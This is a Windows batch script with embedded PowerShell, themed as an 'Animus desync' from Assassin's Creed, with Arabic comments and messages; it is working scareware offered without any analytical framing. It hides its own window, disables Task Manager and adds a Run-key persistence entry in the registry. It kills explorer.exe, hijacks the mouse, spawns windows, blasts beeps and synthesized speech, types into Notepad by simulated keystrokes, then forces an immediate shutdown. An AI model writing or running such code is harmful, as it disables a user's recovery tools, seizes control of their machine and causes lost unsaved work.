@echo off
:: [01: STEALTH & ANIMUS INITIALIZATION]
chcp 65001 >nul
if not "%1"=="animus" (
    echo Set W=CreateObject("WScript.Shell") > "%temp%\animus.vbs"
    echo W.Run chr(34) ^& "%~f0" ^& chr(34) ^& " animus", 0 >> "%temp%\animus.vbs"
    wscript "%temp%\animus.vbs" & del "%temp%\animus.vbs" & exit /b
)

:: [02: ANIMUS LOADING EFFECT - تأثير تحميل الأنيموس]
:: محاكاة واجهة الأوامر البيضاء والرمادية المميزة للأنيموس
start /b cmd /c "color f0 & title ANIMUS_DATA_SYNC... & mode con: cols=100 lines=30 & :loop & echo [LOADING MEMORY BLOCK %random%] ... [SYNC: %random%%%] & echo 𓅓 𓅱 𓏏 --- STAR_LINK_ESTABLISHED --- ⭐ & goto loop"

:: [03: PERSISTENCE & LOCKDOWN]
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HormuzAnimus" /t REG_SZ /d "%~f0" /f >nul 2>&1

:: [04: MULTI-THREADED SONIC SYMPHONY]
:: (الراعي -> الصراخ -> الضحك -> الـ 100 سؤال)
start /b powershell -WindowStyle Hidden -Command "& {
    $s = New-Object -ComObject SAPI.SpVoice; $s.Volume = 100;
    # نغمات الراعي الوحيد
    [console]::beep(783, 600); [console]::beep(880, 600); [console]::beep(932, 1200);
    # صرخة الأنيموس (ترددات متصاعدة حادة)
    for($i=2000; $i -le 9500; $i+=100){ [console]::beep($i, 35) }
    # ضحك ميكانيكي مشوه
    for($i=1; $i -le 10; $i++){ [console]::beep(400, 100); [console]::beep(1500, 100); Start-Sleep -m 30 }
    # الـ 100 سؤال "لماذا لا تضحك معي؟"
    1..100 | ForEach-Object { $s.Rate = (Get-Random -Min -10 -Max 10); $s.Speak('لماذا لا تضحك معي؟') }
}"

:: [05: THE 100 FEATURES & GLITCH FX]
:: محاكاة الخلل البصري في الأنيموس (Animus Glitching)
powershell -WindowStyle Hidden -Command "Stop-Process -Name explorer -Force; 1..100 | ForEach-Object {
    # 1. وميض الشاشة الأبيض (Animus Flash)
    if($_ % 5 -eq 0) { color f0; Start-Sleep -m 50; color 0f; Start-Sleep -m 50; color f0 }
    
    # 2. اهتزاز التزامن (Mouse Desync)
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080));
    
    # 3. رسائل الـ Glitch اللغوي
    if($_ % 15 -eq 0){
        $msg = @('DATA DESYNC: 𓅓𓅱𓏏', 'ستاره تو خاموش شد ⭐', 'MEMORY CORRUPTED', 'لماذا لا تضحك معي؟');
        start cmd /c \"color f0 & echo --- FATAL ERROR: $($msg | Get-Random) --- & pause\";
    }

    # 4. فتح واجهات النظام بشكل جنوني كأنها "Blocks" من الأنيموس
    if($_ % 20 -eq 0){ start notepad.exe; start calc.exe }
    
    # 5. نبضات صوتية كهرومغناطيسية
    [console]::beep((Get-Random -Min 500 -Max 6000), 20);
}"

:: [06: THE GHOST TYPIST (Final Sync)]
start notepad.exe
timeout /t 2 >nul
powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'فشل التزامن... الذاكرة الرقمية تنهار... 100 ميزة استولت على الواقع... اسمع ناي الراعي.. هل تضحك مع النجمة؟.. ⭐ 𓅓𓅱𓏏'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Start-Sleep -Milliseconds 60}"

:: [07: THE ANIMUS SHUTDOWN]
color f0
cls
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  [WARNING]: ANIMUS_CORE_DESYNC_DETECTED         !
echo !  [STATUS]: REALITY_DELETION_IN_PROGRESS         !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  Mors Vincit Omnia. ⭐ 𓅓𓅱𓏏                       !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

:: الصوت الأخير (سؤال النهاية)
powershell -Command "$s = New-Object -ComObject SAPI.SpVoice; $s.Rate = -9; $s.Speak('انتهى التزامن.. لماذا لا تضحك؟')"

timeout /t 10 >nul
powershell -Command "wininit" >nul 2>&1
shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. خرجت من الأنيموس إلى العدم."
